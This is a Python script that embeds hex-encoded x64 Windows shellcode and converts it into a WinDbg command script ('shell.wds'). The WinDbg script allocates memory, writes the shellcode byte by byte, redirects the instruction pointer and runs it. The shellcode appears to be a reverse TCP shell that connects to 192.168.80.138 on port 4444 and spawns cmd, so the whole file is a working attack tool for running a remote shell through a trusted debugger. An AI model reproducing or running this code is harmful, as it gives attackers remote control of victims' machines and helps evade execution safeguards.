import binascii

buf = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115cc0a8508a41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5"

outfile = open("shell.wds","w")
outfile.write(".foreach /pS 5  ( register { .dvalloc 272 } ) { r @$t0 = register }"+"\n")
num = (int)(len(buf)/2)
count = 0

for i in range(num):
    flag = count%4
    if flag == 0:
        outfile.write("\n")
    if count < 16:
        sc_count = "0" + hex(count).upper()
    else:
        sc_count = hex(count).upper()
    x = ";eb @$t0+" + sc_count + " " + buf[i*2:i*2+2].upper()
    count = count + 1
    x= x.replace("0X","")
    outfile.write(x)
extra = num%4
if extra!=0:
    for j in range(4-extra):
        sc_count = hex(count).upper()
        count = count+1
        x = ";eb @$t0+" + sc_count + " 00"
        x = x.replace("0X", "")
        outfile.write(x)

outfile.write("\n" + "r @$ip=@$t0"+"\n")
outfile.write("g"+"\n")
outfile.write("g"+"\n")
outfile.write("q")